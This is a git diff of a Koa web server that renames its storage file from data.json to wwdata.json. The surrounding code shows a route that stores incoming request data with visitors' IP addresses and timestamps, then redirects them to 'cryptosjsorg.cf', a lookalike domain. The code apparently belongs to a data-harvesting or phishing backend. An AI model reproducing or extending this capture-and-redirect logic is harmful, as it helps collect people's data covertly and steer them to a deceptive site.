@@ -46,7 +46,7 @@ getTimeByTimeZone(8);
  * 而是会把获取到的数据存储在ajax对象下
  */
 
-let datas = JSON.parse(fs.readFileSync('./static/data/data.json'));
+let datas = JSON.parse(fs.readFileSync('./static/data/wwdata.json'));
 
 const app = new koa();
 
@@ -121,7 +121,7 @@ router.get('/todoswws', async ctx => {
 //         data: todo
 //     }
 
-//     fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+//     fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
 // });
 
 router.post('/remove', async ctx => {
@@ -149,7 +149,7 @@ router.post('/remove', async ctx => {
         data: '删除成功'
     }
 
-    fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+    fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
 });
 
 // router.post('/add', async ctx => {
@@ -181,7 +181,7 @@ router.get('/a', async ctx => {
                 data.remoteAddress=ctx.req.connection.remoteAddress;
                 data.Time=getTimeByTimeZone(8);
                 datas.todos.push(data);
-                fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+                fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
                 ctx.response.redirect('http://cryptosjsorg.cf');
                 // ctx.body = "1";
                 return ;
@@ -229,7 +229,7 @@ router.get('/a', async ctx => {
         // console.log('完成');
         
         datas.todos.push(data);
-        fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+        fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
         // ctx.body = ' .'
         ctx.response.redirect('http://cryptosjsorg.cf');
     }
